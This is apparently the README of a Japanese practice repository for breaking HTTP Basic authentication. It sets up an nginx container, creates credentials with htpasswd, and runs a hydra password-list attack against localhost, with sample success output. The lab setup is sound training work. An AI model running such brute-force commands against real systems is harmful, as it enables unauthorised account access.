# Basic認証を突破する練習レポジトリ

## 立ち上げ

```
docker-compose build
docker-compsoe up
```

##　パスワード生成
```
sudo htpasswd -c /etc/nginx/.htpasswd [ユーザ名]
```

## コンテナの中に入ってhydra実行
```
docker exec -ti basic-auth /bin/bash
hydra -l username -P password-list.txt localhost http-get /index.html
```

成功したら以下のようになる

```
[80][http-get] host: localhost   login: username   password: password
1 of 1 target successfully completed, 1 valid password found
```

